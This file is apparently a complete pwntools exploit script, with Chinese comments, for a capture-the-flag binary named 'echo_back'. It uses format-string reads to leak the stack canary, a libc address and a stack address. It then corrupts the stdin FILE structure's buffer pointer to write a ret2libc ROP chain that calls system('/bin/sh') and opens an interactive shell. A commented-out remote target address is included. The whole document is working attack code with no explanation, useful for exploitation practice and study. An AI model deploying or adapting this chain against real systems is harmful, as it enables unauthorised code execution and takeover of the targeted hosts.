from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/echo_back')

# 本地测试失败，估计libc版本不同，系统不同，导致stdin结构体不同
p = process('../file/echo_back')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

# p = remote('61.147.171.105', '55457')
# libc = ELF('../file/libc.so.6')

p.sendlineafter(b'choice>> ', b'2')
p.sendlineafter(b'length:', b'8')
p.sendline(b'%11$lx') # canary偏移
p.recvuntil(b'say:')
canary = int(p.recvline(), 16)
print(canary)

def set_name(name):
    p.sendlineafter(b'choice>> ', b'1')
    p.sendlineafter(b'name:', name)

def echo_back(length, content):
    p.sendlineafter(b'choice>> ', b'2')
    p.sendlineafter(b'length:', str(length).encode())
    p.sendline(content)

# 泄露libc地址
echo_back(7, b'%19$p')
p.recvuntil(b'say:')

# 本地
libc.address = (int(p.recvline(), 16) - 128) - libc.sym['__libc_start_main']
pop_rdi_ret = libc.address + 0x000000000002a3e5

# 远程
# libc.address = (int(p.recvline(), 16) - 240) - libc.sym['__libc_start_main']
# pop_rdi_ret = libc.address + 0x0000000000021102

system_addr = libc.sym['system']
str_bin_sh = next(libc.search(b'/bin/sh'))

# 泄露main函数返回时rbp
echo_back(7, b'%12$p')
p.recvuntil(b'say:')
main_rbp_value_in_stack = int(p.recvline(), 16)
main_ret_addr_in_stack = main_rbp_value_in_stack + 8

# 改写stdin buffer最低字节的值为0，写入的name对应的偏移量为16
stdin_buf_base = libc.sym['_IO_2_1_stdin_'] + 0x38
set_name(p64(stdin_buf_base))
echo_back(7, b'%16$hhn')

# 攻击stdin结构体，由于ROP仅需0x18个字节，所有这里写0x18
stdin_buf_base = libc.sym['_IO_2_1_stdin_'] + 0x83
payload = p64(stdin_buf_base) * 3  + p64(main_ret_addr_in_stack) + p64(main_ret_addr_in_stack+0x18)
p.sendlineafter(b'choice>> ', b'2')
p.sendafter(b'length:', payload)
pause()
p.sendline(b'')

for i in range(len(payload)-1):
    p.sendlineafter('choice>> ', b'2')
    p.sendlineafter('length:', b'')

payload = p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)
p.sendlineafter(b'choice>> ', b'2')
p.sendlineafter(b'length:', payload)
pause()
p.sendline(b'')

p.sendlineafter(b'choice>> ', b'3')

p.interactive()
